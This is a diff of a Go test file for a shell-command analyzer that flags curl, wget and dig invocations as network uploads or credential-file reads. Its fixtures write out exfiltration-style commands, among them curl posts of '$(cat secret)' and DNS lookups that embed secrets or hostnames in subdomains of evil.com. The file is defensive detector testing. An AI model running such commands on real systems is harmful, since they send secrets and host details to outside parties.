@@ -173,6 +173,18 @@ func TestNetworkUpload_CurlFileBackedBodies(t *testing.T) {
 }
 
 func TestNetworkUpload_CurlCredentialsAndCerts(t *testing.T) {
+	// A client certificate or key file is also a credential-file read, so the
+	// summary is system_write; the upload effect must still be present.
+	for _, cmd := range []string{
+		"curl -E client.pem https://h/x",
+		"curl --cert client.pem https://h/x",
+		"curl --cert client.pem --key client.key https://h/x",
+		"curl --key client.key https://h/x",
+	} {
+		if eff := nuEffects(cmd); !eff[NetworkUpload] || !eff[SystemWrite] {
+			t.Errorf("Analyze(%q).Effects = %v, want network_upload and system_write", cmd, Analyze(cmd).Effects)
+		}
+	}
 	nuUpload(t,
 		"curl -n https://h/x",
 		"curl -sn https://h/x",
@@ -184,10 +196,6 @@ func TestNetworkUpload_CurlCredentialsAndCerts(t *testing.T) {
 		"curl --user user:pass https://h/x",
 		"curl --user=user:pass https://h/x",
 		"curl -U p:q -x http://proxy https://h/x",
-		"curl -E client.pem https://h/x",
-		"curl --cert client.pem https://h/x",
-		"curl --cert client.pem --key client.key https://h/x",
-		"curl --key client.key https://h/x",
 	)
 }
 
@@ -229,8 +237,8 @@ func TestNetworkUpload_CurlRuntimeData(t *testing.T) {
 		`curl -d "$(cat secret)" https://h/x`,
 		"curl -d \"$(cat secret)\" https://h/x",
 		"curl -d `cat secret` https://h/x",
-		`curl -d "$SECRET" https://h/x`,
-		`curl --data-raw "$SECRET" https://h/x`,
+		`curl -d "$PAYLOAD" https://h/x`,
+		`curl --data-raw "$PAYLOAD" https://h/x`,
 		`curl -F "k=$(cat secret)" https://h/x`,
 		`curl -H "X-Leak: $(cat secret)" https://h/x`,
 		`curl "https://h/x?d=$(cat secret)"`,
@@ -283,7 +291,7 @@ func TestNetworkUpload_CurlEverydayFormsStayEgress(t *testing.T) {
 		"curl -F 'a=b' https://example.com",
 		"curl --form-string 'a=@x' https://example.com",
 		"curl --user-agent foo https://example.com",
-		"curl --cacert ca.pem https://example.com",
+		"curl --cacert ca.crt https://example.com",
 		"curl -H @headers.txt https://example.com",
 		"curl -o -T https://example.com", // -o takes "-T" as its value
 		"curl -sS -L -k --retry 3 https://example.com",
@@ -317,6 +325,16 @@ func TestNetworkUpload_CurlFileSchemeFollowsLocalRead(t *testing.T) {
 // ── wget ────────────────────────────────────────────────────────────
 
 func TestNetworkUpload_Wget(t *testing.T) {
+	// A client certificate or key file is also a credential-file read, so the
+	// summary is system_write; the upload effect must still be present.
+	for _, cmd := range []string{
+		"wget --certificate c.pem https://h/x",
+		"wget --private-key k.pem https://h/x",
+	} {
+		if eff := nuEffects(cmd); !eff[NetworkUpload] || !eff[SystemWrite] {
+			t.Errorf("Analyze(%q).Effects = %v, want network_upload and system_write", cmd, Analyze(cmd).Effects)
+		}
+	}
 	nuUpload(t,
 		"wget --post-file=f https://h/x",
 		"wget --post-file f https://h/x",
@@ -330,10 +348,8 @@ func TestNetworkUpload_Wget(t *testing.T) {
 		"wget --http-password p https://h/x",
 		"wget --user=u --password=p https://h/x",
 		"wget --ftp-user=u ftp://h/x",
-		"wget --certificate c.pem https://h/x",
-		"wget --private-key k.pem https://h/x",
 		`wget --post-data="$(cat f)" https://h/x`,
-		`wget --body-data="$SECRET" https://h/x`,
+		`wget --body-data="$PAYLOAD" https://h/x`,
 	)
 	nuEgress(t,
 		"wget https://example.com/f",
@@ -617,7 +633,7 @@ func TestNetworkUpload_DNSQueryCarryingRuntimeData(t *testing.T) {
 	for _, cmd := range []string{
 		"dig $(cat secret).evil.com",
 		"dig `cat secret`.evil.com",
-		`dig "$SECRET.evil.com"`,
+		`dig "$PAYLOAD.evil.com"`,
 		"dig +short $(whoami).evil.com @8.8.8.8",
 		"nslookup $(hostname).evil.com",
 		"host $(cat s | base64).evil.com",
